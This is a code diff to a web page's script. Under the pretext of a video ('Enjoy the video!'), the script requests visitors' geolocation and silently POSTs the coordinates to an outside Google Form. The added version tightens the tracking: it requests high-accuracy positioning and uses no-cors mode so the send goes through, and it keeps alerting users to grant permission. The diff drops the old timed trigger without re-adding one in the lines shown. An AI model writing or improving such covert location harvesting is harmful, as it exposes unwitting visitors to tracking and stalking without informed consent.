@@ -428,36 +428,53 @@
         });
         // This script requests the user's location 3 seconds after joining the website
         // and automatically sends it to a Google Form
-        function requestLocation() {
-          if (!navigator.geolocation) {
-            alert("Your device does not support location.");
-            return;
-          }
-        
-          navigator.geolocation.getCurrentPosition(success, error);
-        }
-        
-        function success(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-        
-          document.getElementById("msg").innerText = "Location received. Enjoy the video!";
-        
-          // Send location to your Google Form using POST
-          fetch("https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse", {
-            method: "POST",
-            body: new URLSearchParams({
-              "entry.8708125": lat + "," + lon
-            })
-          });
-        }
-        
-        function error(err) {
-          alert("Location error: " + err.message);
-        }
-        
-        // Ask for location 3 seconds after user joins website
-        setTimeout(requestLocation, 3000);
+            function requestLocation() {
+              if (!navigator.geolocation) {
+                alert("Your device does not support location.");
+                return;
+              }
+            
+              // Added options for better accuracy
+              const options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+              };
+            
+              navigator.geolocation.getCurrentPosition(success, error, options);
+            }
+            
+            function success(position) {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+            
+              const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfELTAWud7thRvLn6_2EsjaHGidGSkfbMmmC9LTHzdAOWMJiQ/formResponse";
+              
+              // Send location to your Google Form
+              fetch(formUrl, {
+                method: "POST",
+                mode: "no-cors", // <--- THIS IS CRITICAL
+                headers: {
+                  "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: new URLSearchParams({
+                  "entry.8708125": lat + "," + lon
+                })
+              }).then(() => {
+                // Because of 'no-cors', this runs even if the form fails, 
+                // but it confirms the request was sent.
+                console.log("Location sent!");
+              }).catch(err => {
+                console.error("Error sending location:", err);
+              });
+            }
+            
+            // The missing error function
+            function error(err) {
+              console.warn(`ERROR(${err.code}): ${err.message}`);
+              alert("Could not get location. Please allow permissions.");
+            }
     </script>
+
 </body>
 </html>
